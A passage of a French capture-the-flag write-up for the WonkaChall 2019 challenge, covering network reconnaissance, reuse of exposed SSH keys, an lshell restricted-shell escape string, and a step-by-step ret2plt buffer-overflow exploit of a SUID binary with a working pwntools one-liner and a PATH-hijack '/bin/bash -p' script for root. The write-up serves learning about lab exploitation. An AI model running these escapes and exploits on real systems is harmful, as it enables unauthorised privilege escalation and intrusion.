+<li><strong>Vivek Gite</strong>, <em>Linux route Add Command Examples</em>, cyberciti : <a href="https://www.cyberciti.biz/faq/linux-route-add/">https://www.cyberciti.biz/faq/linux-route-add/</a></li>
+<li><strong>Walter Glenn</strong>, <em>How to Add a Static TCP/IP Route to the Windows Routing Table</em>, howtogeek : <a href="https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/">https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="x-step-10-the-great-escape">X. Step 10 - The Great Escape</h2>
+
+<blockquote>
+<p>Run Otman run, get out of this jail!</p>
+</blockquote>
+
+<h3 id="tl-dr-9">TL;DR</h3>
+
+<ol>
+<li>Trouver l&rsquo;autre machine via ARP : <code>cat /proc/net/arp</code> ;</li>
+<li>Remarquer que <strong>nginx</strong> est installé ;</li>
+<li>Dans la configuration du nginx, trouver la racine du <em>frontend</em> : <code>/usr/share/nginx/dev3.challenge.akerva.com</code> ;</li>
+<li>Récupérer une clé privée SSH dans l&rsquo;un des dossiers ;</li>
+<li>Grâce à l&rsquo;indice de Akerva, on connait l&rsquo;utilisateur de la machine distante : <strong>violet</strong> ;</li>
+<li>Atterrir dans un environnement restreint : <strong>lshell</strong> ;</li>
+<li>Trouver l&rsquo;issue de sécurité sur le git permettant de s&rsquo;échapper de l&rsquo;environnement restreint : <code>echo opmd &amp;&amp; cd () bash &amp;&amp; cd</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="x-1-reconnaissance">X.1. Reconnaissance</h3>
+
+<p>Personnellement, l&rsquo;un de mes premiers reflexes en post exploitation est de vérifier le cache <strong>arp</strong> :</p>
+
+<pre><code class="language-bash">(SRV01-WEB-WW3) ➜ cat /proc/net/arp 
+IP address       HW type     Flags       HW address            Mask     Device
+172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
+172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
+</code></pre>
+
+<p>Une nouvelle IP a été trouvé : <code>172.16.69.65</code>. Il n&rsquo;est pas possible de ré-utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet.</p>
+
+<h4 id="x-1-a-172-16-69-65">X.1.a. 172.16.69.65</h4>
+
+<p>Pour des soucis de rapidité, j&rsquo;ai préféré utiliser <strong>masscan</strong> plutôt que nmap.</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
+Discovered open port 22/tcp on 172.16.69.65                                                                     
+</code></pre>
+
+<p>Un service sur le port 22 est disponible, le SSH en question. Il n&rsquo;y a pas d&rsquo;autres services.</p>
+
+<h4 id="x-1-b-172-16-69-78-srv01-web-ww3">X.1.b. 172.16.69.78 (SRV01-WEB-WW3)</h4>
+
+<p>La machine <em>SRV01-WEB-WW3</em> a un service de plus exposé :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78            
+Discovered open port 80/tcp on 172.16.69.78                                    
+Discovered open port 22/tcp on 172.16.69.78                                    
+</code></pre>
+
+<h3 id="x-2-connexion-ssh-au-serveur-distant">X.2. Connexion SSH au serveur distant</h3>
+
+<p>Etant donné qu&rsquo;un service web est exposé et qu&rsquo;un accès ssh est disponible, il est possible de lister directement le contenu de <code>/var/www/html</code> :</p>
+
+<pre><code class="language-bash">(SRV01-WEB-WW3) ➜ ls /var/www/html
+index.html  index.nginx-debian.html
+</code></pre>
+
+<p>À première vue, le serveur utilisé est un <em>nginx</em>. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier <code>/etc/nginx/sites-available</code> :</p>
+
+<pre><code class="language-bash">(SRV01-WEB-WW3) ➜ ls /etc/nginx/sites-available
+default  dev3.challenge.akerva.com
+
+(SRV01-WEB-WW3) ➜ cat /etc/nginx/sites-available/dev3.challenge.akerva.com
+server {
+	server_name dev3.challenge.akerva.com;
+	listen 80;
+	listen [::]:80;
+	root /usr/share/nginx/dev3.challenge.akerva.com;
+	index index.html index.php;
+	autoindex off;
+	
+	add_header X-Frame-Options SAMEORIGIN;
+	add_header X-Content-Type-Options nosniff;
+	add_header X-XSS-Protection &quot;1; mode=block&quot;;
+
+	location / {
+		if (-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html){
+		return 503;
+		}
+	}
+	
+	location  ~ /\.{
+		deny all;
+		access_log off;
+		log_not_found off;
+	}
+	
+	#Error pages
+	error_page 503 /index.html;
+	location = /index.html {
+		root /usr/share/nginx/dev3.challenge.akerva.com/error/;
+		internal;
+	}
+	
+	location ~ ^/.*\.php {
+            try_files $uri =503;
+            include fastcgi_params;
+            fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+            fastcgi_split_path_info ^/(.+\.php)(/.*)$;
+            fastcgi_index index.php;
+            fastcgi_param HTTPS on;
+            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+            fastcgi_param PATH_INFO $fastcgi_path_info;
+            fastcgi_intercept_errors on;
+        }
+
+}
+</code></pre>
+
+<p>Plusieurs informations intéressantes se trouvent dans ce fichier, dont la racine du site web : <code>/usr/share/nginx/dev3.challenge.akerva.com</code> :</p>
+
+<pre><code class="language-bash">(SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com
+total 24
+drwxr-xr-x 6 root     root     4096 juil.  5 11:08 .
+drwxr-xr-x 5 root     root     4096 juin  21 18:42 ..
+drwxr-xr-x 2 www-data www-data 4096 juin  26 17:01 error
+drwxr-xr-x 2 www-data www-data 4096 juil.  4 10:52 golden_tickets
+drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 keys
+drwxr-xr-x 2 www-data www-data 4096 juil.  5 11:08 scripts
+
+(SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com/keys
+total 12
+drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 .
+drwxr-xr-x 6 root     root     4096 juil.  5 11:08 ..
+-rw-r----- 1 www-data www-data 1679 juin  26 18:02 id_rsa
+</code></pre>
+
+<p>Une clé privée SSH est disponible dans l&rsquo;arborescence du <em>frontend</em>. La connexion à l&rsquo;autre machine doit être possible avec cette clé. Il ne manque que l&rsquo;utilisateur associé. La clé privée est disponible <a href="https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w">ici</a>.</p>
+
+<p>La plateforme de challenge du <a href="https://challenge.akerva.com">WonkaChall</a> propose un hint par épreuve. Pour cette étape, le hint est le nom de l&rsquo;utilisateur, à savoir <strong>violet</strong>.</p>
+
+<p>Connaissant le nom de l&rsquo;utilisateur et la clé associée, il est possible de se connecter au serveur distant :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step10_lshell.png" alt="" />
+<em>Fig 39</em> : SSH connection and restricted shell
+</center></p>
+
+<h3 id="x-3-escaping-the-restricted-shell">X.3. Escaping the restricted shell</h3>
+
+<p>Dans la réalité, le shell restreint n&rsquo;est pas apparu directement. En utilisant <em>zsh</em>, j&rsquo;ai rencontré un soucis (dont j&rsquo;ignore totalement la cause). Par contre, cela m&rsquo;a permis d&rsquo;accéder à l&rsquo;erreur suivante :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa
+
+Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Fri Jul 19 11:36:53 2019 from 10.8.0.14
+Traceback (most recent call last):
+  File &quot;/usr/bin/lshell&quot;, line 52, in &lt;module&gt;
+    main()
+  File &quot;/usr/bin/lshell&quot;, line 38, in main
+    userconf = CheckConfig(args).returnconf()
+  File &quot;/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py&quot;, line 69, in _init_
+    self.get_global()
+  File &quot;/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py&quot;, line 145, in get_global
+    self.config.read(self.conf['configfile'])
+  File &quot;/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py&quot;, line 697, in read
+    self._read(fp, filename)
+  File &quot;/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py&quot;, line 1027, in _read
+    for lineno, line in enumerate(fp, start=1):
+  File &quot;/usr/lib/python2.7/encodings/ascii.py&quot;, line 26, in decode
+    return codecs.ascii_decode(input, self.errors)[0]
+UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 2854: ordinal not in range(128)
+Connection to 172.16.69.65 closed.
+</code></pre>
+
+<p>Grâce à l&rsquo;erreur python trouvée, très explicite, il me fût facile de tomber sur le <a href="https://github.com/ghantoos/lshell">GitHub</a> de lshell. Pour s&rsquo;évader de ce shell restreint, le plus simple reste d&rsquo;inspecter les différentes <em>issues</em> de sécurité du dépôt. Actuellement, il n&rsquo;y a qu&rsquo;une issue de securité active : <a href="https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754">https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754</a></p>
+
+<p>L&rsquo;utilisateur <strong>omega8cc</strong> mentionne un moyen de s&rsquo;échapper fonctionnel :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP lshell) ➜ echo FREEDOM! &amp;&amp; cd () bash &amp;&amp; cd
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step10_escapeshell.png" alt="" />
+<em>Fig 40</em> : Evasion du shell restreint
+</center></p>
+
+<p>Le flag est situé dans le <em>home</em> de <strong>violet</strong> :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as violet) ➜ cat /etc/passwd|grep violet
+violet:x:1000:1000:violet,,,:/home/violet:/usr/bin/lshell
+(SRV02-BACKUP as violet) ➜ ls /home/violet
+flag-10.txt
+(SRV02-BACKUP as violet) ➜ cat /home/violet/flag-10.txt
+d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
+</code></pre>
+
+<h3 id="x-4-flag">X.4. Flag</h3>
+
+<blockquote>
+<p>d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-8">Resources</h3>
+
+<ol>
+<li><strong>ghantoos</strong>, <em>lshell - SECURITY ISSUE: Inappropriate parsing of command syntax</em>, GitHub : <a href="https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754">https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="xi-step-11-free-flag">XI. Step 11 - Free flag</h2>
+
+<blockquote>
+<p>Free for all \o/</p>
+</blockquote>
+
+<h3 id="tl-dr-10">TL;DR</h3>
+
+<ol>
+<li>Remarquer qu&rsquo;il existe des fichiers world readable dans le <strong>/home</strong> du système ;</li>
+<li>Lire la clé privée de l&rsquo;utilisateur <strong>Georgina</strong> ;</li>
+<li>Se connecter avec cette clé privée et accéder au <em>home</em> de Georgina.</li>
+</ol>
+
+<hr />
+
+<h3 id="xi-1-trouver-la-clé-privé">XI.1. Trouver la clé privé</h3>
+
+<p>Étant connecté sur un système avec un utilisateur &ldquo;standard&rdquo;, naturellement je regarde s&rsquo;il m&rsquo;est possible d&rsquo;accéder aux <em>home</em> des autres utilisateurs du système. C&rsquo;est comme cela que j&rsquo;ai trouvé une clé privée dans le <em>home</em> de l&rsquo;utilisateur <strong>Georgina</strong> :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step11_worldreadable.png" alt="" />
+<em>Fig 41</em> : Clé privée disponible en lecture pour tous les utilisateurs
+</center></p>
+
+<p>La clé privée est disponible <a href="https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8">ici</a>.</p>
+
+<p>Il ne reste plus qu&rsquo;à se connecter au même serveur en tant que <em>Georgina</em> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ chmod 0600 ~/Documents/id_rsa_georgina 
+(KaliVM) ➜  ssh georgina@172.16.69.65 -i ~/Documents/id_rsa_georgina
+[...]
+(SRV02-BACKUP as Georgina) ➜ cat flag-11.txt 
+5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
+</code></pre>
+
+<h3 id="xi-2-flag">XI.2. Flag</h3>
+
+<blockquote>
+<p>5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5</p>
+</blockquote>
+
+<hr />
+
+<hr />
+
+<h2 id="xii-step-12-return-to-plankton">XII. Step 12 - Return to PLankTon</h2>
+
+<blockquote>
+<p>Pwn2Own</p>
+</blockquote>
+
+<h3 id="tl-dr-11">TL;DR</h3>
+
+<ol>
+<li>Utiliser <strong>LinEnum</strong> afin de trouver <strong>exportVIP</strong> un binaire <em>SUID</em> et <em>SGID</em> ;</li>
+<li>Trouver l&rsquo;overflow de manière empirique ;</li>
+<li>Déterminer le padding (de 296 octets) nécessaire à la réécriture de RSP ;</li>
+<li>Regarder la <strong>plt</strong> du binaire et les protections mises en place, en déduire que l&rsquo;exploitation est un <code>ret2plt</code> ;</li>
+<li>Récupérer l&rsquo;adresse de la fonction <strong>system</strong> disponible dans la <em>plt</em> ;</li>
+<li>Trouver un gadget <code>pop rdi; ret</code> dans le binaire nécessaire pour le placement des arguments ;</li>
+<li>Trouver l&rsquo;adresse d&rsquo;une chaîne de caractère dans le binaire, par exemple <strong>GNU</strong> ;</li>
+<li>Faire un script exécutant un <code>/bin/bash -p</code>, l&rsquo;appeler <strong>GNU</strong> et le rajouter dans le <em>PATH</em> ;</li>
+<li>Exploiter le <code>ret2plt</code> en appelant la fonction <em>system</em> en plaçant <em>GNU</em> en paramètre : <code>/opt/exportVIP &lt; &lt;(python -c 'from pwn import *; print &quot;a&quot;*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)</code></li>
+</ol>
+
+<hr />
+
+<h3 id="xii-1-post-exploitation">XII.1. Post exploitation</h3>
+
+<p>Etant connecté en tant que <em>Georgina</em> ou <em>Violet</em>, le but est d&rsquo;élever ses privilèges et de récupérer un accès <strong>root</strong> au serveur. Pour cela, il existe de nombreux scripts d&rsquo;énumération pour de la post-exploitation sur GitHub. Personnellement, je trouve que <strong>LinEnum</strong> est le plus pertinent. Ci-dessous les résultats importants remontés par <em>LinEnum</em> :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as Georgina) ➜ ./LinEnum.sh -s -r report -e /dev/shm -t
+
+[...]
+[-] SUID files:
+-rwsr-xr-x 1 root root 10232 mars  28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 440728 mars   1 17:19 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 42992 juin   9 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 59680 mai   17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 50040 mai   17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75792 mai   17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40504 mai   17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 40312 mai   17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 1019656 mai   28 22:13 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 40536 mai   17  2017 /bin/su
+-rwsr-xr-x 1 root root 44304 mars   7  2018 /bin/mount
+-rwsr-xr-x 1 root root 31720 mars   7  2018 /bin/umount
+-rwsr-xr-x 1 root root 61240 nov.  10  2016 /bin/ping
+-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
+-rwsr-xr-x 1 root root 110760 mars  20  2017 /sbin/mount.nfs
+
+[-] SGID files:
+-rwxr-sr-x 1 root mail 19008 janv. 17  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root ssh 358624 mars   1 17:19 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root crontab 40264 oct.   7  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 27448 mars   7  2018 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 71856 mai   17  2017 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 22808 mai   17  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 14768 avril 12  2017 /usr/bin/bsd-write
+-rwxr-sr-x 1 root mail 10952 déc.  25  2016 /usr/bin/dotlock.mailutils
+-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
+-rwxr-sr-x 1 root shadow 35592 mai   27  2017 /sbin/unix_chkpwd
+[...]
+</code></pre>
+
+<p>Un seul de ces binaires n&rsquo;est pas un programme par défaut : <strong>/opt/exportVIP</strong>. Si il est possible d&rsquo;exécuter des commandes avec ce binaire, alors il sera possible d&rsquo;exécuter des commandes en tant qu&rsquo;utilisateur <strong>root</strong>. Il est préférable de réaliser l&rsquo;analyse en local, dans un environnement maîtrisé :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP .
+</code></pre>
+
+<p>Le binaire est disponible <a href="https://mega.nz/#!DrxxwK6a!1hOFmmYMrImfOaGUC6aIfbTn8oPCyDqwDWgBcKSbz24">ici</a>.</p>
+
+<h3 id="xii-2-informations-sur-le-binaire">XII.2. Informations sur le binaire</h3>
+
+<p>C&rsquo;est un binaire 64 bits, strippé et linké dynamiquement :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ file ./exportVIP 
+exportVIP: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=46f5d9039533417cd40afbe9f9a7dbdf3726b897, stripped
+</code></pre>
+
+<p>Un <strong>stripped binary</strong> est un binaire sans les symboles de debug. Il est plus léger qu&rsquo;un binaire non strippé. L&rsquo;absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur <em>exportVIP</em>, il n&rsquo;y en a pas beaucoup :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ checksec --file ./exportVIP
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols       No	0		4	./exportVIP
+</code></pre>
+
+<p>Merci à <a href="https://twitter.com/tomtombinary">Tomtombinary</a>, pour le schéma ci-dessous, résumant les types d&rsquo;exploitation possibles en fonction des protections activées. <strong>Cependant , veuillez noter que le schéma n&rsquo;est PAS complet</strong>.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/exploitation_protection.png" alt="" />
+<em>Fig 42</em> : Type d&rsquo;exploitation en fonction des protections
+</center></p>
+
+<p>Dans le cadre de l&rsquo;exploitation de <strong>exportVIP</strong>, le <em>bit NX</em> est activé, et sans doute l&rsquo;<em>ASLR</em> . Enfin l&rsquo;outil <strong>readelf</strong> permet d&rsquo;obtenir des informations complémentaires comme les fonctions présentes dans la <em>plt</em>, le contenu de la <em>got</em> et bien d&rsquo;autres choses.</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ readelf -a ./exportVIP
+
+[...]
+Section de réadressage '.rela.plt' à l\'adresse de décalage 0x528 contient 8 entrées:
+  Décalage        Info           Type           Val.-symboles Noms-symb.+ Addenda
+000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 strncpy@GLIBC_2.2.5 + 0
+000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+000000404028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
+000000404030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0
+000000404038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
+000000404040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 snprintf@GLIBC_2.2.5 + 0
+000000404048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
+000000404050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
+[...]
+</code></pre>
+
+<p>La fonction <strong>system</strong> étant présente dans la plt du binaire, cela va nous faciliter l&rsquo;exploitation. En effet, si l&rsquo;on se réfère au schéma de la figure 42, il faudrait leak une adresse de la libc, récupérer l&rsquo;adresse de base de la libc et appeler la fonction <em>system</em>.  Geluchat a fait un bon <a href="https://www.dailysecurity.fr/return_oriented_programming/">article</a> sur son blog à ce sujet.</p>
+
+<p>Dans le cas du binaire <em>exportVIP</em>, la fonction <em>system</em> est déjà présente dans le programme. Il suffit donc de l&rsquo;appeler en plaçant l&rsquo;argument voulu.</p>
+
+<h3 id="xii-3-explication-de-l-exploitation">XII.3. Explication de l&rsquo;exploitation</h3>
+
+<p>L&rsquo;objectif est d&rsquo;appeler la fonction <em>system</em> avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP pour rediriger le flux d&rsquo;exécution sur l&rsquo;adresse de <em>system</em>, si on veut résumer. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamiques (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug.</p>
+
+<p>Lorsque le signal système <em>SIGSEGV</em> est levé, cela signifie que le programme concerné à <strong>segmentation fault</strong>. En d&rsquo;autres termes, une fonction du programme a tenté d&rsquo;accéder à une zone mémoire non existante ou non autorisée. Dans le cadre d&rsquo;une exploitation d&rsquo;un buffer overflow, c&rsquo;est une bonne chose, car RIP a bien été réécrit. Il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l&rsquo;assembleur 64 bits, le premier argument d&rsquo;une fonction se place dans le registre <em>rdi</em>. Afin d&rsquo;exécuter la charge utile, il est possible de trouver une chaîne de caractère dans le programme <em>exportVIP</em>, comme &ldquo;GNU&rdquo; par exemple. Cette chaîne est présente dans tous les ELF (binaire linux).</p>
+
+<p>Lorsque la chaîne a été choisie, il faut trouver son adresse dans le binaire ; <em>exportVIP</em> n&rsquo;étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu&rsquo;à créer un script s&rsquo;appelant comme la chaîne choisi et à l&rsquo;ajouter dans le <em>PATH</em>. En résumé, l&rsquo;objectif est de faire :</p>
+
+<pre><code class="language-c">system(&quot;GNU&quot;);
+</code></pre>
+
+<p>Pour placer &ldquo;GNU&rdquo; dans <em>rdi</em>, il faut trouver un gadget. Un gadget est une suite d&rsquo;instruction assembleur présente dans le binaire. Il faut donc trouver un gadget <code>pop rdi; ret</code>. Pour rappel, la stack fonctionne comme ceci :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/stack.jpg" alt="" />
+</center></p>
+
+<p>Au final, le payload d&rsquo;exploitation final devra ressembler à :</p>
+
+<pre><code class="language-bash">padding + gadget + adresse de GNU + adresse de system
+</code></pre>
+
+<h3 id="xii-4-exploitation">XII.4. Exploitation</h3>
+
+<h4 id="xii-4-a-déterminer-le-padding">XII.4.a. Déterminer le padding</h4>
+
+<p>Lorsque l&rsquo;on cherche le padding d&rsquo;un buffer overflow, la librairie <strong>pwntool</strong> peut être utile, car elle nous permet de générer un pattern. Ce pattern d&rsquo;une taille arbitraire mais suffisamment grande servira à faire <em>segfault</em> le programme. La valeur contenu dans RSP servira à déterminer la taille du padding :</p>
+
+<pre><code class="language-python">from pwn import *
+
+# generate pattern
+cyclic(400)
+
+# find offset
+find_cyclic('yaac')
+296
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step12_padding.png" alt="" />
+<em>Fig 43</em> : Padding pour contrôler RIP
+</center></p>
+
+<p>Le padding pour contrôler RIP est de 296 octets.</p>
+
+<p><em>Note</em> : L&rsquo;instruction <strong>ret</strong> étant un alias pour <code>pop rip</code>, il faut donc observer le contenu du stack pointer, soit <strong>rsp</strong>.</p>
+
+<h4 id="xii-4-b-récupérer-l-adresse-de-system">XII.4.b. Récupérer l&rsquo;adresse de system</h4>
+
+<p>Pour trouver l&rsquo;adresse de <code>system</code>, il n&rsquo;est pas nécessaire de sortir l&rsquo;artillerie lourde (IDA Pro, Ghidra&hellip;). Un simple <strong>objdump</strong> fait l&rsquo;affaire :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ objdump -D ./exportVIP | grep system
+0000000000401060 &lt;system@plt&gt;:
+  40133d:	e8 1e fd ff ff       	callq  401060 &lt;system@plt&gt;
+</code></pre>
+
+<p>Le <em>call</em> de <em>system</em> dans le binaire est à l&rsquo;adresse <strong>0x40133d</strong>.</p>
+
+<h4 id="xii-4-c-trouver-un-bon-gadget">XII.4.c. Trouver un bon gadget</h4>
+
+<p>Lister les gadgets d&rsquo;un binaire peut se faire avec l&rsquo;outil <strong>ROPGadget</strong>. Il permet de trouver les différents gadget et leur adresse. Pour rappel on cherche un <code>pop rdi; ret</code> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ ROPgadget.py --binary ../exportVIP
+
+[...]
+0x000000000040145b : pop rdi ; ret
+[...]
+</code></pre>
+
+<p>L&rsquo;adresse du gadget est donc <strong>0x000000000040145b</strong></p>
+
+<h4 id="xii-4-d-trouver-l-adresse-de-la-chaîne-gnu">XII.4.d. Trouver l&rsquo;adresse de la chaîne GNU</h4>
+
+<p>La dernière pièce du puzzle est l&rsquo;adresse de la chaîne <strong>GNU</strong> dans <em>exportVIP</em>. Toujours avec <strong>objdump</strong>, il est possible de récupérer l&rsquo;adresse de cette chaîne :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ objdump -s /home/maki/Documents/wonkachall2019/step8/exportVIP
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step12_gnuaddr.png" alt="" />
+<em>Fig 44</em> : Adresse de &ldquo;GNU&rdquo;
+</center></p>
+
+<p>L&rsquo;adresse de <strong>GNU</strong> n&rsquo;est pas vraiment <strong>0x4002d0</strong>, on peut voir que ce n&rsquo;est pas aligné. Il suffit d&rsquo;enlever 4 octets :</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; hex(0x4002d4-0x4)
+'0x4002d0'
+</code></pre>
+
+<p>L&rsquo;adresse de <strong>GNU</strong> est : <strong>0x4002d0</strong></p>
+
+<h4 id="xii-4-e-ajout-d-un-binaire-gnu-dans-le-path">XII.4.e. Ajout d&rsquo;un binaire GNU dans le PATH</h4>
+
+<p>Le binaire &ldquo;GNU&rdquo; va contenir un simple <code>bash -p</code>, l&rsquo;argument permet de garder les droits de l&rsquo;utilisateur pendant l&rsquo;exécution.</p>
+
+<pre><code class="language-bash">#!/bin/bash -p
+
+/bin/bash -p
+</code></pre>
+
+<p>Ce script sera stocké dans le dossier <strong>/tmp</strong> :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as Georgina) ➜ vim /tmp/GNU # Collage du script ci-dessus
+(SRV02-BACKUP as Georgina) ➜ chmod 777 /tmp/GNU
+(SRV02-BACKUP as Georgina) ➜ export PATH=$PATH:/tmp
+</code></pre>
+
+<h3 id="xii-5-exécution">XII.5. Exécution</h3>
+
+<p>Tous les paramètres sont maintenant disponibles : le padding, l&rsquo;adresse du gadget, l&rsquo;adresse de GNU et l&rsquo;adresse de système. Il ne reste plus qu&rsquo;à exploiter.</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as Georgina) ➜ /opt/exportVIP &lt; &lt;(python -c 'from pwn import *; print &quot;a&quot;*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step12_root.png" alt="" />
+<em>Fig 45</em> : Accès root
+</center></p>
+
+<p><em>Note</em> : La librairie <em>pwntool</em> est disponible sur le serveur distant. C&rsquo;est plutôt rare, mais c&rsquo;est arrangeant.</p>
+
+<p>Le flag de cette étape se trouve dans le dossier <em>/root</em>.</p>
+
+<h3 id="xii-6-flag">XII.6. Flag</h3>
+
+<blockquote>
+<p>6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-9">Resources</h3>
+
+<ol>
+<li><strong>Rémi Martin</strong>, <em>Exploitation – ByPass ASLR+NX with ret2plt</em>, shoxx-website : <a href="http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html">http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html</a></li>
+<li><strong>Geluchat</strong>, <em>Petit Manuel du ROP à l&rsquo;usage des débutants</em>, dailysecurity : <a href="https://www.dailysecurity.fr/return_oriented_programming/">https://www.dailysecurity.fr/return_oriented_programming/</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="xiii-step-13-the-final-countdown">XIII. Step 13 - The final countdown</h2>
+
+<blockquote>
+<p>SHA256(WillyWonka&rsquo;s chief name)</p>
+</blockquote>
+
+<h3 id="tl-dr-12">TL;DR</h3>
+
+<ol>
+<li>Trouver la machine qui manque sur le schéma réseau avec arp : <code>cat /proc/net/arp</code> ;</li>
